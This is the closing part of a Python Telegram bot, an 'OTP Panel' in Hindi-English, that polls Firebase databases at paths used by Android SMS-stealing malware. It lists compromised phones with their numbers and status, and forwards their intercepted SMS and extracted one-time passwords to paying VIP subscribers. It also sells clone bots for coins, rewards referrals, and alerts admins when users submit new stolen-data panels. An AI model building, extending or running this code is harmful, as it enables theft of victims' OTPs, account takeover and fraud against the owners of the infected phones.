        lb_text = "🏆 GLOBAL LEADERBOARD (Top 10)\n━━━━━━━━━━━━━━━━━━\n" + "".join([f"{i}. {info.get('name', 'Unknown')} — {info.get('otp_count', 0)} OTPs\n" for i, (uid, info) in enumerate(sorted(users_db.items(), key=lambda x: x[1].get("otp_count", 0), reverse=True)[:10], 1)]) + "━━━━━━━━━━━━━━━━━━\nSabse zyada OTPs use karne wale users ki list."
        return await update.message.reply_text(lb_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")

    if text == "🎁 Invite (1H VIP)" and is_main_bot:
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
        avail_refs = all_users.get(chat_id, {}).get("referrals", 0) - all_users.get(chat_id, {}).get("spent_refs", 0)
        
        ref_text = f"💸 REFER & EARN\n━━━━━━━━━━━━━━━━━━\nInvite 15 friends = <b>1 Hour UNLIMITED VIP Access!</b>\n\nYour Available Referrals: <b>{avail_refs}/15</b>\n\n⚠️ <b>STRICT PENALTY RULE:</b>\nAgar invite kiya hua dost 24h se pehle channel leave karta hai, to dono ko <b>-100 Coins Penalty</b> lagegi aur 1 Referral minus hoga!\n\n🔗 Your Referral Link:\n<code>{ref_link}</code>"
        
        kb = [[InlineKeyboardButton("Share Link ↗️", url=f"https://t.me/share/url?url={ref_link}&text=Try this premium OTP Panel Bot!")]]
        if avail_refs >= 15:
            kb.insert(0, [InlineKeyboardButton("🟢 Redeem 1H VIP (15 Refs)", callback_data="redeem_vip")])
            
        return await update.message.reply_text(ref_text, disable_web_page_preview=True, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

    if text == "👤 My Profile":
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        user_data = users_db.get(chat_id, {})
        avail_refs = user_data.get('referrals', 0) - user_data.get('spent_refs', 0)
        prof_text = f"👤 MY PROFILE\n━━━━━━━━━━━━━━━━━━\nName: {user_data.get('name', 'Unknown')}\nID: <code>{chat_id}</code>\nJoined: {user_data.get('joined_at', 'N/A')}\n" + (f"Coins Balance: {user_data.get('coins', 0)} 🪙\nAvailable Referrals: {avail_refs} 👥\nTotal Referrals: {user_data.get('referrals', 0)}\n" if is_main_bot else "") + f"Total OTPs Used: {user_data.get('otp_count', 0)} 📩\nVIP Status: {get_vip_time_left(bot_token, chat_id)}\n"
        return await update.message.reply_text(prof_text, parse_mode="HTML")

    if text == "💬 Support Group": return await update.message.reply_text("Support group link aapko admin se milega.", disable_web_page_preview=True)
    
    if text == "🛡 Admin Panel" and is_admin: 
        user_focus.setdefault(bot_token, {}).pop(chat_id, None)
        return await update.message.reply_text(admin_panel_text(bot_token), reply_markup=admin_keyboard(bot_token), parse_mode="HTML")

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action: pending_action.pop(chat_id); return await update.message.reply_text("✅ Action cancelled.")
        else: return await update.message.reply_text("ℹ️ No pending action to cancel.")

    state = pending_action.get(chat_id)
    if not state: return

    action = state.get("action")
    
    if action == "check_number_input":
        number = re.sub(r"\D", "", text)
        if len(number) < 10: return await update.message.reply_text("❌ Invalid number! Enter a valid 10-digit Indian number.")
        number = number[-10:] 
        
        service = state["service"]
        pending_action.pop(chat_id)
        
        wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...")
        res = await check_number_api(service, number)
        
        is_error = res.get("status") == "error"
        ms = res.get("ms", 0)
        is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
        
        trigger_limit_if_unregistered(chat_id, is_reg, is_error)
        
        res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
        
        kb = []
        if not is_reg and not is_error:
            kb.append([InlineKeyboardButton("🔍 Find this Number in Panels", callback_data=f"search_num:{number}")])
        kb.append([InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")])
        
        return await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

    if action == "add_api_key" and is_admin:
        pending_action.pop(chat_id)
        SYS_SETTINGS.setdefault("api_keys", []).append(text.strip())
        return await update.message.reply_text(f"✅ API Key Added Successfully!\n\nTotal Keys: {len(SYS_SETTINGS['api_keys'])}")
        
    if action == "del_api_key" and is_admin:
        pending_action.pop(chat_id)
        key_to_del = text.strip()
        if key_to_del in SYS_SETTINGS.get("api_keys", []):
            SYS_SETTINGS["api_keys"].remove(key_to_del)
            return await update.message.reply_text(f"✅ API Key Removed!\n\nRemaining Keys: {len(SYS_SETTINGS['api_keys'])}")
        else:
            return await update.message.reply_text("❌ Ye key database me nahi mili.")

    if action == "add_firebase_main" and is_admin and is_main_bot:
        pending_action.pop(chat_id)
        parts = text.split(":", 1) if ":" in text else [text, text]
        name, url = parts[0].strip(), parts[1].strip() if ":" in text else text.strip()
        if not url.startswith("http"): return await update.message.reply_text("⚠️ Invalid URL. URL http/https se start hona chahiye.")
        DATABASES[name] = url
        return await update.message.reply_text(f"✅ Firebase added successfully!\n\nName: {name}\nURL: {url}\n\nTotal Databases: {len(DATABASES)}")

    if action == "add_personal_db":
        if not text.startswith("http"): return await update.message.reply_text("⚠️ Invalid URL. Starting with http/https bhejein.")
        pending_action.pop(chat_id)
        users_db.setdefault(chat_id, {}).setdefault("personal_dbs", []).append(text)
        await update.message.reply_text("✅ Personal Firebase URL Added! Use '🔥 Auto My DB' to scan it.")
        if is_main_bot:
            for adm in SYS_SETTINGS.get("admins", []):
                try: await _main_app.bot.send_message(adm, f"🚨 <b>NEW USER PANEL ADDED</b>\nUser ID: {chat_id}\nURL: {text}", parse_mode="HTML")
                except: pass
        return

    if action == "gift_vip" and is_admin:
        pending_action.pop(chat_id)
        parts = text.split()
        if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
            target_id = int(parts[0])
            hours = int(parts[1])
            if target_id in users_db:
                current_vip = users_db[target_id].get("vip_until", 0.0)
                users_db[target_id]["vip_until"] = max(time.time(), current_vip) + (hours * 3600)
                try:
                    await _main_app.bot.send_message(target_id, f"🎉 <b>VIP GIFT RECEIVED!</b>\n\nAdmin ne aapko <b>{hours} hours</b> ka Unlimited VIP access diya hai! Ab aap bot ka pura faida utha sakte hain.", parse_mode="HTML")
                except: pass
                return await update.message.reply_text(f"✅ Success!\nUser <code>{target_id}</code> ko {hours} hours VIP mil gaya hai.", parse_mode="HTML")
            else:
                return await update.message.reply_text("❌ User not found in database.")
        else:
            return await update.message.reply_text("❌ Invalid format. Please enter as `USER_ID HOURS` (Example: 123456789 4). Action Cancelled.")

    if action == "gift_coins_all" and is_admin:
        pending_action.pop(chat_id)
        if not text.isdigit() or int(text) <= 0: return await update.message.reply_text("⚠️ Invalid coins. Action cancelled.")
        wait_msg = await update.message.reply_text(f"⏳ Sabhi users ko {text} coins send kiye ja rahe hain...")
        app_to_use = _main_app if is_main_bot else CLONES[bot_token]["app"]
        for uid in list(users_db.keys()):
            users_db[uid]["coins"] = users_db[uid].get("coins", 0) + int(text)
            try: await app_to_use.bot.send_message(uid, f"🎁 <b>SURPRISE GIFT FROM ADMIN!</b> 🎁\n\nAdmin ne aapko <b>{text} Coins</b> free diye hain!\nAapka naya balance check karne ke liye '👤 My Profile' par click karein.", parse_mode="HTML")
            except: pass
        return await wait_msg.edit_text(f"✅ SUCCESSFULLY GIFTED!\n━━━━━━━━━━━━━━━━━━\nSabhi users ko {text} coins de diye gaye hain.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")]]))
    
    if action == "create_bot" and is_main_bot:
        pending_action.pop(chat_id)
        req_coins = state.get("req_coins", 20)
        if not re.match(r"^\d+:[A-Za-z0-9_-]+$", text): return await update.message.reply_text("⚠️ Invalid Token Format. Sahi token bhejein ya /cancel likhein.")
        if all_users.get(chat_id, {}).get("coins", 0) < req_coins: return await update.message.reply_text(f"❌ Aapke paas {req_coins} coins nahi hain.")
        wait_msg = await update.message.reply_text("⏳ Bot start ho raha hai, please wait...")
        try:
            new_app = await start_clone_bot(text)
            bot_info = await new_app.bot.get_me()
            all_users[chat_id]["coins"] -= req_coins
            all_users[chat_id]["bots_created"] = all_users[chat_id].get("bots_created", 0) + 1
            CLONES[text] = {"creator": chat_id, "expiry": time.time() + 86400, "custom_db": None, "app": new_app, "users": {}, "username": bot_info.username}
            await wait_msg.edit_text(f"✅ Aapka bot successfully ban gaya!\n━━━━━━━━━━━━━━━━━━\nLink: @{bot_info.username}\nExpiry: 24 Hours\n\nAb aap apne bot me jaakar /start karein aur 'Admin Panel' se apna Firebase URL bhi add kar sakte hain.")
            await update.message.reply_text("Menu updated.", reply_markup=get_reply_menu(is_admin, bot_token, chat_id))
        except Exception as e: await wait_msg.edit_text(f"❌ Bot start karne me error aayi. Token check karein. Error: {e}")
        return

    if action == "add_custom_db" and not is_main_bot and is_admin:
        if not text.startswith("http"): return await update.message.reply_text("⚠️ Invalid URL. Starting with http/https bhejein.")
        pending_action.pop(chat_id); CLONES[bot_token]["custom_db"] = text
        return await update.message.reply_text("✅ Custom Firebase URL set ho gaya! Ab aapke bot me ye database bhi chalega.")

    if action == "search_number":
        pending_action.pop(chat_id)
        search_term = re.sub(r"\D", "", text)
        if len(search_term) < 4: return await update.message.reply_text("⚠️ Enter at least 4 digits to search.")
        wait_msg = await update.message.reply_text("⏳ Searching databases...")
        all_devices = [d for tag in GLOBAL_DEVICE_CACHE for d in GLOBAL_DEVICE_CACHE.get(tag, [])]
        found_devs = [d for d in all_devices if any(search_term in num for num in d.numbers) and d.status == "online"]
        if not found_devs: return await wait_msg.edit_text("📭 No matching online numbers found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
        rows = [[InlineKeyboardButton(f"🟢 📱 [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:10]]
        rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
        return await wait_msg.edit_text(f"🔍 Search Results for: {search_term}\nSelect below:", reply_markup=InlineKeyboardMarkup(rows))

    if action == "broadcast_msg" and is_admin:
        pending_action.pop(chat_id)
        targets = chats_registry.get(bot_token, set())
        wait_msg = await update.message.reply_text(f"⏳ Broadcasting to {len(targets)} users...")
        app_to_use = _main_app if is_main_bot else CLONES[bot_token]["app"]
        for cid in targets:
            if cid != chat_id:
                try: await app_to_use.bot.send_message(cid, text, parse_mode="HTML")
                except: pass
        return await wait_msg.edit_text(f"📢 BROADCAST COMPLETE", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_refresh")]]))

# ══════════════════════════════════════════════════════════════════
#  FIREBASE POLL — AGGRESSIVE FETCHER
# ══════════════════════════════════════════════════════════════════

async def _forward_sms(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: return

    label = device_label(device)
    otp = extract_otp(body)
    msg_text = auto_forward_msg(sms, label)
    
    kb_rows = []
    if otp: kb_rows.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
    kb_rows.append([InlineKeyboardButton("📩 View Messages", callback_data=f"msgs:{device.id}"), InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{device.id}")])
    markup = InlineKeyboardMarkup(kb_rows)
    send_tasks = []

    for bot_token, chat_dict in user_focus.items():
        if bot_token != TOKEN:
            if bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]: continue
            app_to_use, users_db = CLONES[bot_token]["app"], CLONES[bot_token]["users"]
        else: app_to_use, users_db = _main_app, all_users

        for chat_id in [cid for cid, did in chat_dict.items() if did == device.id and is_vip(bot_token, cid)]:
            if otp: users_db.setdefault(chat_id, {})["otp_count"] = users_db.get(chat_id, {}).get("otp_count", 0) + 1
            send_tasks.append(app_to_use.bot.send_message(chat_id, msg_text, reply_markup=markup, parse_mode="HTML"))
            
    if send_tasks: await asyncio.gather(*send_tasks, return_exceptions=True)

async def fetch_single_db(tag: str, url: str) -> Tuple[str, List[Device]]:
    async with SCAN_SEMAPHORE:
        try:
            sim_all, device_info_all, user_data_all, clients_all, devices_all, users_all = await asyncio.gather(
                fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url),
                fb_get("user_data", url), fb_get("clients", url), fb_get("Devices", url), fb_get("Users", url), return_exceptions=True
            )

            devices_list, added_set = [], set()

            if isinstance(sim_all, dict):
                info_all = device_info_all if isinstance(device_info_all, dict) else {}
                for dev_id, sim in sim_all.items():
                    if dev_id in added_set or not isinstance(sim, dict): continue
                    added_set.add(dev_id)
                    info = info_all.get(dev_id) or {}
                    nums = extract_all_nums(sim, info)
                    model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                    ts = info.get("currentTimeMillis") or info.get("timestamp") or sim.get("timestamp")
                    
                    devices_list.append(Device(id=dev_id, name=model, status=get_status(info.get("Status") or sim.get("status"), ts), battery=parse_battery(info.get("Battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))

            if isinstance(user_data_all, dict):
                for dev_id, data in user_data_all.items():
                    if dev_id in added_set or not isinstance(data, dict): continue
                    added_set.add(dev_id)
                    nums = extract_all_nums(data)
                    ts = data.get("timestamp")
                    
                    devices_list.append(Device(id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}", status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=data.get("Device_info") or f"Device ID: {dev_id}", sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag))

            if isinstance(clients_all, dict):
                for dev_id, client in clients_all.items():
                    if dev_id in added_set or not isinstance(client, dict): continue
                    sim_list = client.get("sims", [])
                    nums = extract_all_nums(client, sim_list[0] if len(sim_list)>0 else {}, sim_list[1] if len(sim_list)>1 else {})
                    if not nums and not client.get("modelName"): continue
                    added_set.add(dev_id)
                    model = client.get("modelName") or f"Device-{dev_id[:6]}"
                    status = "online" if client.get("status") is True else "offline"
                    
                    devices_list.append(Device(id=dev_id, name=model, status=status, battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag))
                    
            if isinstance(devices_all, dict):
                for dev_id, data in devices_all.items():
                    if dev_id in added_set or not isinstance(data, dict): continue
                    added_set.add(dev_id)
                    nums = extract_all_nums(data)
                    model = data.get("model") or data.get("PhoneModel") or f"Device-{dev_id[:6]}"
                    ts = data.get("timestamp")
                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Devices/{dev_id}/sms", base_url=url, db_tag=tag))

            if isinstance(users_all, dict):
                for dev_id, data in users_all.items():
                    if dev_id in added_set or not isinstance(data, dict): continue
                    added_set.add(dev_id)
                    nums = extract_all_nums(data)
                    model = data.get("model") or data.get("name") or f"Device-{dev_id[:6]}"
                    ts = data.get("timestamp")
                    devices_list.append(Device(id=dev_id, name=model, status=get_status(data.get("status"), ts), battery=parse_battery(data.get("battery")), timestamp=safe_ts(ts), numbers=nums, device_info=f"Model: {model}\nDevice ID: {dev_id}", sms_path=f"Users/{dev_id}/sms", base_url=url, db_tag=tag))

        except: pass
        return tag, devices_list

async def fetch_all_databases() -> Dict[str, List[Device]]:
    tasks = [fetch_single_db(tag, url) for tag, url in DATABASES.items()]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return {tag: devices for result in results if isinstance(result, tuple) for tag, devices in [result]}

async def poll_single_db(tag: str, url: str, is_first_run: bool = False) -> int:
    async with SCAN_SEMAPHORE:
        try:
            r_main, r_user, r_root = await asyncio.gather(fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True)
            device_map = {d.id: d for d in GLOBAL_DEVICE_CACHE.get(tag, [])}
            
            for bulk_data in (r_main, r_user, r_root):
                if not isinstance(bulk_data, dict): continue
                for dev_id, sms_dict in bulk_data.items():
                    if not isinstance(sms_dict, dict) or not device_map.get(dev_id): continue
                    for k, sms in sms_dict.items():
                        if not isinstance(sms, dict): continue
                        sk = seen_key(dev_id, k)
                        if sk in seen_ids: continue
                        seen_ids.add(sk)
                        if not is_first_run:
                            try: await _forward_sms(device_map.get(dev_id), sms)
                            except: pass
                                
            type4_devs = [d for d in GLOBAL_DEVICE_CACHE.get(tag, []) if d.sms_path.endswith("receivedSms")]
            if type4_devs:
                async def fetch_t4_sms(d: Device):
                    sms_dict = await fb_get(d.sms_path, d.base_url)
                    if isinstance(sms_dict, dict):
                        for k, sms in sms_dict.items():
                            if not isinstance(sms, dict): continue
                            sk = seen_key(d.id, k)
                            if sk in seen_ids: continue
                            seen_ids.add(sk)
                            if not is_first_run:
                                try: await _forward_sms(d, sms)
                                except: pass
                await asyncio.gather(*(fetch_t4_sms(d) for d in type4_devs))
            return 1
        except: return 0

async def poll_loop(app: Application) -> None:
    global first_run, _main_app
    _main_app = app
    
    while True:
        try:
            for tag, devices in (await fetch_all_databases()).items():
                if devices: GLOBAL_DEVICE_CACHE[tag] = devices
                await asyncio.sleep(0.01)
            
            tasks = [poll_single_db(tag, url, is_first_run=first_run) for tag, url in DATABASES.items() if GLOBAL_DEVICE_CACHE.get(tag)]
            if tasks: await asyncio.gather(*tasks, return_exceptions=True)
            
            if first_run:
                first_run = False
                total_devices = sum(len(devs) for devs in GLOBAL_DEVICE_CACHE.values())
                online_devices = sum(1 for devs in GLOBAL_DEVICE_CACHE.values() for d in devs if d.status == 'online')
                tlog(f"✅ Bot Ready! {len(DATABASES)} DBs, {total_devices} devices, {online_devices} online")
            
        except Exception: pass
        await asyncio.sleep(POLL_INTERVAL)

# ══════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════════

def main() -> None:
    print("═" * 60)
    print("  🤖 OTP PANEL BOT — VIP EDITION (1000+ USERS)")
    print("  🚀 Fresh SMS Filter | Owner Transfer | Railway Ready")
    print(f"  📱 {len(DATABASES)} Databases Loaded Successfully")
    print("═" * 60)

    app = Application.builder().token(TOKEN).connection_pool_size(100).pool_timeout(60.0).connect_timeout(30.0).read_timeout(30.0).write_timeout(30.0).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("check", cmd_check_group)) 
    app.add_handler(ChatMemberHandler(track_joins, ChatMemberHandler.CHAT_MEMBER)) 
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)

    async def post_init(application: Application) -> None:
        load_data()
        for clone_token, c_data in list(CLONES.items()):
            if time.time() < c_data.get("expiry", 0):
                try: CLONES[clone_token]["app"] = await start_clone_bot(clone_token)
                except Exception: pass

        asyncio.create_task(poll_loop(application))
        asyncio.create_task(auto_save_loop())
        asyncio.create_task(auto_backup_loop(application))
        asyncio.create_task(dummy_web_server())

    app.post_init = post_init
    
    try: app.run_polling(drop_pending_updates=True)
    except KeyboardInterrupt: print("\n✅ Bot stopped safely by user.")
    except Exception: pass

if __name__ == "__main__":
    main()
